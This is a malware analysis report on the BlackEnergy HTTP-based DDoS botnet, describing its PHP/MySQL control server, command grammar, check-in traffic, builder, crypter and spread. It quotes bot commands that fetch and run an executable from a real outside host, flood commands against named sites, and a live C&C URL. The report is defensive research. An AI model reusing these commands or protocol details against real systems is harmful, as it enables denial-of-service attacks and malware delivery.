Summary
BlackEnergy is an HTTP-based botnet used primarily for DDoS attacks. Unlike most
common bots, this bot does not communicate with the botnet master using IRC. Also, we
do not see any exploit activities from this bot, unlike a traditional IRC bot. This is a small
(under 50KB) binary for the Windows platform that uses a simple grammar to
communicate. Most of the botnets we have been tracking (over 30 at present) are located
in Malaysian and Russian IP address space and have targeted Russian sites with their
DDoS attacks.
This report is based on analysis of the distribution package of the BlackEnergy botnet,
tracking approximately 30 live and distinct botnets, and disassembly of several samples
captured in the wild.

BlackEnergy DDoS Bot Analysis

Introduction
BlackEnergy is a web-based distributed denial of service (DDoS) bot used by the Russian
hacker underground. We have begun tracking various networks using this bot to
command and control their botnets. BlackEnergy gives the attackers an easy to control
web-based bot that can launch various attacks and control the bots using a minimal
syntax and structure. The BlackEnergy tools appear to have been developed by one or
more Russian hackers. Also, at this time, most of the BlackEnergy command and control
system (C&C) systems we have seen are hosted in Malaysia and Russia and are attacking
Russian targets.
One of the main features the BlackEnergy bot author likes to promote in forums is that
the bot can target more than one IP address per hostname. The authors promote that this
feature is designed for targets that use DNS load balancing and ensures that their bots
target all hosts for the attack. Also, the bot author has used a runtime encrypter to thwart
antivirus detection.

Bot Command System
The BlackEnergy HTTP C&C is built on PHP, MySQL. In our investigations we often
see compromised Linux or BSD servers that have been set up for this purpose. The
toolkit has common filenames, such as “auth.php” and “db.sql”, and an informative help
file written in Russian. The system normally installs with a password protection scheme
using HTTP basic authentication to protect the botnet. Much of what we have learned
about this botnet has come from captured PHP files and unprotected installations.
The botnet configuration is stored in a simple MySQL database. The commands have the
following database schema:
CREATE TABLE `opt` (
`name` varchar(255) NOT NULL,
`value` varchar(255) NOT NULL,
PRIMARY KEY (`name`)
);

The values for “name” can be any of the following and mirror the web UI controls (see
below):
• attack_mode – a numerical value for the type of attack (default, drop by socket,
drop by timeout)
• cmd – the command to send to the bot (see below)
• http_freq – how many requests per second to send in HTTP GET flood mode
• http_threads – how many program threads to create for the HTTP flood
• icmp_freq – how many ICMP packets to send in an ICMP attack mode
• icmp_size – how large of ICMP packets to send in ICMP attack mode
• max_sessions – for ‘drop by timeout’

spoof_ip – Boolean, used in raw packet flooding attacks
syn_freq – how frequently to send packets during a TCP SYN flood
tcpudp_freq – how often to send TCP or UDP traffic
tcp_size – how large the TCP packets should be
udp_size – how large the UDP packets should be
ufreq – how long (in minutes) to wait before checking for another command

A small table ‘stat’ is also created to track the size of the botnet and how well it has
grown over time.
CREATE TABLE `stat` (
`id` varchar(50) NOT NULL,
`addr` varchar(16) NOT NULL,
`time` int(11) NOT NULL,
`build` varchar(255) NOT NULL,
PRIMARY KEY (`id`)
);

The time a bot has polled the web server, the client’s IP address, and the build ID it
presents in the POST data are all logged. The botnet control interface (see below)
presents a summary of this information to the botnet master.

Bot Command Vocabulary
The BlackEnergy bot has a minimal vocabulary, based around three different types of
commands. The first are the DDoS attack commands, the second is a download
functionality, and the third are commands to stop the bot. Mutiple commands may also be
given and are separated by a semicolon, ie ‘get http://1.2.3.4/sample.exe;wait’.
DDoS attacks the BlackEnergy botnet can launch are controlled by the following
arguments to the ‘flood’ command:
•
•
•
•
•
•

icmp – a basic ICMP ping flood
syn – a basic TCP SYN flood
udp – a basic UDP traffic flood
http – an HTTP GET request flooder. This command is given in the format ‘flood
http <hostname> <optional URI>’, for example “flood http www.li-da.org
index.php”. If no URI is given the bot will flood ‘/’.
data – a basic binary packet flooder
dns – a DNS request flooder

Several of these attacks – the ICMP flood, the TCP SYN flood, the UDP flood, the DNS
flood and possibly the data flood attack – can utilize spoofed source addresses.
BlackEnergy also has a simple download mechanism. Although it is not documented in
the versions we have analyzed we have seen it used in the wild. The command to tell the
bots to fetch and launch a new executable is ‘get <url>’, i.e. “#get

http://85.255.120.26/files/setup.exe”. This is similar to the IRC bot commands where a
simple downloader is built into most bots. This binary does not seem to replace the
original BlackEnergy bot binary, so it is unclear how the bots would be updated via this
mechanism in the wild.
Finally, the bots can be told to remain silent and only check back for new commands via
the “wait” or “stop” commands. “Stop” may be used to tell the bot to cease all DDoS
attacks, and “wait” may just be a placeholder for the bots. Finally, the “die” command
tells the bots to exit.

Bot Communications
The BlackEnergy botnet uses HTTP to communicate to its controlling servers by sending
a POST message to the server. The message contains information about the bot’s ID and
its build ID. The specific bot ID is built from the system’s SMB hostname and the
System Volume ID from the C:\ drive. The botnet manager sets the build ID for the bot
when the bot binary is built. This build ID could be used for tracking updates and
distributions, or it could be used to screen out interlopers, such as our BlackEnergy
tracker. When possible we set the build ID to an observed value.
Here is a bot checking into to the botnet controller at the URL
http://psamtek.cn/dot/stat.php, showing the POST data and the header values. In this case,
the malware was running on an Intel x86-based processor running Windows XP SP2.
Data was captured using the CWSandbox automated analysis system.
POST /dot/stat.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;
.NET CLR 1.1.4322)
Host: psamtek.cn
Content-Length: 31
Cache-Control: no-cache
id=xCR2_243AEDBA&build_id=D5729

An example of what the bot would receive in response is shown below:
HTTP/1.1 200 OK

The response is Base64 encoded, and a simple transformation of this data show the
command issued to the bots:
'10;2000;10;0;0;30;100;3;20;1000;2000#wait#10#xCR2_243AEDBA'

Splitting the fields along the ‘#’ reveals that bot has no specific commands at this time
and should come back in ten minutes, although packet flooding options are always
expressed. The fields are separated by a semicolon and are, in order: ICMP frequency,
ICMP packet size, SYN frequency, spoof IP or not (Boolean value), the attack mode, the
maximum number of HTTP sessions, the HTTP connection frequency, the number of
HTTP threads, the TCP and UDP frequency, the UDP size, and the TCP packet size. The
bot’s host ID is also echoed back to the bot, but it is unclear what purpose this serves.
Actual other commands we have seen from BlackEnergy botnets include:
2;2;5;0;2;5;2000;2;20;1026;1#flood syn hywd.info 80#60#xHOST
10;3000;10;1;0;30;10;25;15;2000;3000#flood http

10;2000;10;1;0;30;50;50;20;1000;2000#flood syn www.ceag.ru,ceag.ru
80,81,82,83,443,25,22,21,110#10#xHOST

These commands reveal how flexible the DDoS options can be with this botnet. Note that
the botnet tracker SMB hostname has been removed from all of the log examples.
Based on the POST data sent to the botnet C&C we observe at least three different major
variants of the bot. The first uses a simple two-part data string to communicate with the
web server, presenting the bot host ID and the build ID using two different variables.
Another variant uses only one variable, ‘data’, to submit this information, and separates
these two values with a colon (‘:’). The third type of BlackEnergy bot we see sends
significantly more information to the botnet, including the bot’s ability to provide a

SOCKS proxy, an HTTP proxy, as well as if it can receive an ICMP echo and its network
speed. The evolutionary timeline of these variants is unclear at this time.

Botnet Runtime Configuration
The botnet master is given a simple PHP-based web UI to configure their botnet and
given minimal statistics. This has the benefit of reducing the programming burden on the
botnet master as well as presenting some minimal statistics for them.

Availability
BlackEnergy is not widely available on the web, however in Russian language forums for
computer hackers and the underground we have seen prices for BlackEnergy bots at
around US$40. The latest version is believed to be BlackEnergy version 1.7, released
sometime in the summer of 2007. The BlackEnergy kit includes the web front end in PHP
and with a MySQL setup (the schema, shown above, and the PHP code that integrates

17 files

A system driver, “syssrv.sys”, is used to hide the bot’s processes and files, and is
provided in the package as the file “calc.exe”. This is a basic rootkit that may or may not
“ship” with the bot during an infection cycle. The file “_bot.exe” is the encrypted bot
binary (see below). Because no exploit code is included in the basic BlackEnergy HTTP
bot, external tools and methods must be used to load the bot onto a victim PC.
The files under “www/” contain the web server functionality and settings to communicate
with the database as well as the password for users to log in, which is stored in “pass.txt”.
The botnet will communicate with the file “stat.php”, and the administrator will interact
with the PHP scripts “auth.php” to authenticate and “index.php” for botnet control and
reporting.

BlackEnergy Build Time Configuration
The BlackEnergy bot, like most bots, uses a C&C server that is hardcoded into the
compiled binary itself. The BlackEnergy kit is provided with a GUI configuration and
build tool (builder.exe). The user can set up the location of the C&C server as well as
defaults for attacks and actions. While the user can change the value, a unique build ID
for the bot binary is generated at every invocation of the builder.exe program. This GUI
tool is shown below.
Unlike most bots, however, the builder file calls a second executable over the bot binary
(bot.exe) to encrypt it, yielding “_bot.exe” (by default), the final version of the bot. This

is designed to defeat most antivirus detection. This “crypter” leaves a telltale signature in
the binary that can be fingerprinted using a tool such as PEID. At runtime, the bot binary
will decrypt itself in memory and execute as a normal Windows executable.

Detection by AntiVirus
A representative malware sample was used to determine AV coverage estimates,
assuming the sample was a typical bot and had been known for at least 24 hours. What
we found is that only a handful AV tools detect this sample in a meaningful way, and
some with misleading names such as “Downloader”, “BHO” (indicating a simple Internet
Explorer Browser Helper Object), or spyware. This multi-scanner detection was
performed using the VirusTotal service on September 25, 2007, at 17:26 CET.

BlackEnergy DDoS Attack Activity
We have been tracking BlackEnergy botnets to study their popularity and the severity of
the attacks they have been launching. To date (October 2, 2007) we have identified 27
active DDoS networks built on the BlackEnergy bot system. These URLs map back to 19
distinct IP addresses. 5 HTTP servers for BlackEnergy bots are located in TTNET, a
Malaysian ISP using ASNs 9930 and 9121. The complete list of ASNs and counts is here:

Several of the botnets examined at contain a few hundred or less bots in them. Because of
the authentication required to view the configuration in many of the setups, we cannot
accurately estimate the size of the world’s BlackEnergy botnets.

Conclusions
The BlackEnergy DDoS bot is another web-based bot that follows the standard models in
this emerging malcode space. It uses a user-defined poll interval to look for new
commands and a simple command structure. Like other web-based bots, it uses Base64
encoding of the commands to obscure the attackers’ intentions. We do not see significant
DDoS attacks from most of these networks at this time, although we do know that at least
one network was involved in high profile attacks on a Norwegian bank.
BlackEnergy appears to be a recently developed bot in active development, and the
author has clearly lofty goals of AV detection and stealth. We expect more developments
in the near future with this bot, and possibly more high profile DDoS targets as the
attackers utilize their botnet.
